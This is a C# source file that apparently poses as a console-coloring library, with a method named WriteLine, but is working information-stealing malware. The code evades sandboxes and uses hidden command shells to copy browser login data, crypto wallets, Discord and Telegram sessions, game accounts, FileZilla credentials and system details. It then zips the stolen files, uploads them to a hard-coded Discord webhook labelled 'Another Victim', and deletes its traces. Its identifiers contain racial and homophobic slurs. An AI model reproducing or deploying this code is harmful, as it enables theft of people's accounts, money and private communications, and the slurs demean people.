using System.Diagnostics;

namespace Colorful
{
    public class Colorful
    {
        public static bool IsVirusTotal()
        {
            if (Environment.UserName == "admin" && Environment.MachineName == "WORK" && Environment.CommandLine == $"\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
            else if (Environment.UserName == "John" && Environment.MachineName.StartsWith("WIN") && Environment.CommandLine == $"c:\\Users\\John\\Downloads\\\"{AppDomain.CurrentDomain.FriendlyName}\"") return true;
            return false;
        }
        public static void WriteLine()
        {
            if (IsVirusTotal())
                Environment.Exit(0);
            Process cmd = new Process();

            string nigger = Environment.UserName + "-AntiHeil";

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%");
            cmd.StandardInput.WriteLine("mkdir " + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir Messengers");
            cmd.StandardInput.WriteLine("cd Messengers");
            cmd.StandardInput.WriteLine("mkdir Whatsapp");
            cmd.StandardInput.WriteLine("mkdir Telegram");
            cmd.StandardInput.WriteLine("mkdir Skype");
            cmd.StandardInput.WriteLine("mkdir Discord");
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir Gaming");
            cmd.StandardInput.WriteLine("cd Gaming");
            cmd.StandardInput.WriteLine("mkdir RiotGames");
            cmd.StandardInput.WriteLine("mkdir EpicGames");
            cmd.StandardInput.WriteLine("mkdir Minecraft");
            cmd.StandardInput.WriteLine("mkdir Steam");
            cmd.StandardInput.WriteLine("mkdir GrowTopia");
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir SystemInfo");
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir Servers");
            cmd.StandardInput.WriteLine("cd Servers");
            cmd.StandardInput.WriteLine("mkdir FileZilla");
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir Browsers");
            cmd.StandardInput.WriteLine("cd Browsers");
            cmd.StandardInput.WriteLine("mkdir GoogleChrome");
            cmd.StandardInput.WriteLine("mkdir Opera");
            cmd.StandardInput.WriteLine("mkdir OperaGx");
            cmd.StandardInput.WriteLine("mkdir MicrosoftEdge");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%/Opera Software/Opera Gx Stable");
            cmd.StandardInput.WriteLine("copy \"Bookmarks\" %appdata%\\" + nigger + "\\Browsers\\OperaGx");
            cmd.StandardInput.WriteLine("copy \"History\" %appdata%\\" + nigger + "\\Browsers\\OperaGx");
            cmd.StandardInput.WriteLine("copy \"Login Data\" %appdata%\\" + nigger + "\\Browsers\\OperaGx");
            cmd.StandardInput.WriteLine("copy \"Web Data\" %appdata%\\" + nigger + "\\Browsers\\OperaGx");
            cmd.StandardInput.WriteLine("xcopy Network %appdata%\\" + nigger + "\\Browsers\\OperaGx /h /i /c /k /e /r /y");
            cmd.StandardInput.WriteLine("copy \"Local State\" %appdata%\\" + nigger + "\\Browsers\\OperaGx");
            cmd.StandardInput.WriteLine("cd Local Storage");
            cmd.StandardInput.WriteLine("xcopy leveldb %appdata%\\" + nigger + "\\Browsers\\OperaGx /h /i /c /k /e /r /y");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%\\" + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("mkdir Wallets");
            cmd.StandardInput.WriteLine("cd Wallets");
            cmd.StandardInput.WriteLine("mkdir Armory");
            cmd.StandardInput.WriteLine("mkdir ByteCoin");
            cmd.StandardInput.WriteLine("mkdir Liberty");
            cmd.StandardInput.WriteLine("mkdir Etherum");
            cmd.StandardInput.WriteLine("mkdir Electrum");
            cmd.StandardInput.WriteLine("mkdir Atomic");
            cmd.StandardInput.WriteLine("mkdir Guarda");
            cmd.StandardInput.WriteLine("mkdir Coinomi");
            cmd.StandardInput.WriteLine("mkdir Exodus");
            cmd.StandardInput.WriteLine("copy %appdata%\\Armory %appdata%\\" + nigger + "\\Wallets\\Armory");
            cmd.StandardInput.WriteLine("copy %appdata%\\bytecoin %appdata%\\" + nigger + "\\Wallets\\ByteCoin");
            cmd.StandardInput.WriteLine("copy %appdata%\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb %appdata%\\" + nigger + "\\Wallets\\Liberty");
            cmd.StandardInput.WriteLine("copy %appdata%\\Ethereum\\keystore %appdata%\\" + nigger + "\\Wallets\\Etherum");
            cmd.StandardInput.WriteLine("copy %appdata%\\Electrum\\" + nigger + "\\Wallets %appdata%\\" + nigger + "\\Wallets\\Electrum");
            cmd.StandardInput.WriteLine("copy %appdata%\\atomic\\Local Storage\\leveldb %appdata%\\" + nigger + "\\Wallets\\Atomic");
            cmd.StandardInput.WriteLine("copy %appdata%\\Guarda\\Local Storage\\leveldb %appdata%\\" + nigger + "\\Wallets\\Guarda");
            cmd.StandardInput.WriteLine("copy %appdata%\\Coinomi\\Coinomi\\" + nigger + "\\Wallets %appdata%\\" + nigger + "\\Wallets\\Coinomi");
            cmd.StandardInput.WriteLine("copy %appdata%\\Exodus\\exodus.wallet %appdata%\\" + nigger + "\\Wallets\\Exodus");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%/Telegram Desktop");
            cmd.StandardInput.WriteLine("copy tdata %appdata%\\" + nigger + "\\Messengers\\Telegram");
            cmd.StandardInput.WriteLine("cd %localappdata%\\Packages\\");
            cmd.StandardInput.WriteLine("copy 5319275A.WhatsAppDesktop_cv1g1gvanyjgm %appdata%\\" + nigger + "\\Messengers\\Whatsapp");
            cmd.StandardInput.WriteLine("cd %appdata%\\Microsoft\\Skype for Desktop");
            cmd.StandardInput.WriteLine("copy Local Storage %appdata%\\" + nigger + "\\Messengers\\Skype");
            cmd.StandardInput.WriteLine("cd %appdata%\\discord\\Local Storage\\leveldb");
            cmd.StandardInput.WriteLine("copy *.ldb %appdata%\\" + nigger + "\\Messengers\\Discord");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %localappdata%\\Riot Games\\Riot Client\\data");
            cmd.StandardInput.WriteLine("xcopy Cookies %appdata%\\" + nigger + "\\Gaming\\RiotGames /E /Q /Y");
            cmd.StandardInput.WriteLine("copy RiotGamesPrivateSettings.yaml %appdata%\\" + nigger + "\\Gaming\\RiotGames");
            cmd.StandardInput.WriteLine("cd %localappdata%\\EpicGamesLauncher\\Saved");
            cmd.StandardInput.WriteLine("xcopy Data %appdata%\\" + nigger + "\\Gaming\\EpicGames /E /Q /Y");
            cmd.StandardInput.WriteLine("cd %localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows");
            cmd.StandardInput.WriteLine("copy GameUserSettings.ini %appdata%\\" + nigger + "\\Gaming\\EpicGames");
            cmd.StandardInput.WriteLine("cd C:\\Program Files (x86)\\Steam");
            cmd.StandardInput.WriteLine("copy config %appdata%\\" + nigger + "\\Gaming\\Steam");
            cmd.StandardInput.WriteLine("copy *ssfn* %appdata%\\" + nigger + "\\Gaming\\Steam");
            cmd.StandardInput.WriteLine("copy %localappdata%\\Growtopia\\save.dat %appdata%\\" + nigger + "\\Gaming\\GrowTopia");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%\\.minecraft\\");
            cmd.StandardInput.WriteLine("copy launcher_accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\launcher_accounts.json");
            cmd.StandardInput.WriteLine("copy launcher_profiles.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\launcher_profiles.json");
            cmd.StandardInput.WriteLine("copy TlauncherProfiles.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\TlauncherProfiles.json");
            cmd.StandardInput.WriteLine("copy meteor-client\\accounts.nbt %appdata%\\" + nigger + "\\Gaming\\Minecraft\\accounts.nbt");
            cmd.StandardInput.WriteLine("copy Impact\\alts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\alts.json");
            cmd.StandardInput.WriteLine("copy Novoline\\alts.novo %appdata%\\" + nigger + "\\Gaming\\Minecraft\\alts.novo");
            cmd.StandardInput.WriteLine("copy cheatbreaker_accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\cheatbreaker_accounts.json");
            cmd.StandardInput.WriteLine("copy launcher_accounts_microsoft_store.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\launcher_accounts_microsoft_store.json");
            cmd.StandardInput.WriteLine("copy Rise\\alts.txt %appdata%\\" + nigger + "\\Gaming\\Minecraft\\alts.txt");
            cmd.StandardInput.WriteLine("cd %appdata%/paladium-group/");
            cmd.StandardInput.WriteLine("copy accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\paladiumaccounts.json");
            cmd.StandardInput.WriteLine("cd %appdata%/PolyMC/");
            cmd.StandardInput.WriteLine("copy accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\polymcaccounts.json");
            cmd.StandardInput.WriteLine("cd %appdata%/Badlion Client/");
            cmd.StandardInput.WriteLine("copy accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\badlionaccounts.json");
            cmd.StandardInput.WriteLine("cd %userprofile%/intentlauncher/rise/");
            cmd.StandardInput.WriteLine("copy alts.txt %appdata%\\" + nigger + "\\Gaming\\Minecraft\\riseniggers.txt");
            cmd.StandardInput.WriteLine("cd %userprofile%/intentlauncher/");
            cmd.StandardInput.WriteLine("copy launcherconfig %appdata%\\" + nigger + "\\Gaming\\Minecraft\\launcherconfig");
            cmd.StandardInput.WriteLine("cd %userprofile%/.lunarclient/settings/game/");
            cmd.StandardInput.WriteLine("copy accounts.json %appdata%\\" + nigger + "\\Gaming\\Minecraft\\lunarfaggot.json");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd  %appdata%\\" + nigger + "\\SystemInfo");
            cmd.StandardInput.WriteLine("systeminfo >> SystemInformation.txt");
            cmd.StandardInput.WriteLine("wmic path softwareLicensingService get OA3xOriginalProductKey >> productkey.txt");
            cmd.StandardInput.WriteLine("tasklist >> tasklist.txt");
            cmd.StandardInput.WriteLine("ipconfig/all >> ips.txt");
            cmd.StandardInput.WriteLine("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List >> AntiVirus.txt");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %localappdata%/FileZilla");
            cmd.StandardInput.WriteLine("copy recentservers.xml %appdata%\\" + nigger + "\\Servers\\FileZilla");
            cmd.StandardInput.WriteLine("copy sitemanager.xml %appdata%\\" + nigger + "\\Servers\\FileZilla");
            cmd.StandardInput.WriteLine("tar.exe -a -c -f %appdata%\\" + nigger + ".zip %appdata%\\" + nigger);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("set \"attachment=%appdata%\\" + nigger + ".zip\"");
            cmd.StandardInput.WriteLine("set \"message_text=Another Victim\"");
            cmd.StandardInput.WriteLine("curl -k -F \"payload_json={\\\"content\\\": \\\"%message_text% \\\"}\" -F \"file1=@%attachment%\" https://discord.com/api/webhooks/1163608728218652744/F6GnzxSamhGDGS9l_nq3_pqhKoj5pYsKdr-PWENCwFikoretiQeBTl4C3zJwmvbX76hg");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("cd %appdata%");
            cmd.StandardInput.WriteLine("rmdir /s /q " + Environment.UserName + "-AntiHeil");
            cmd.StandardInput.WriteLine("del /f " + nigger + ".zip");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
        }
    }
}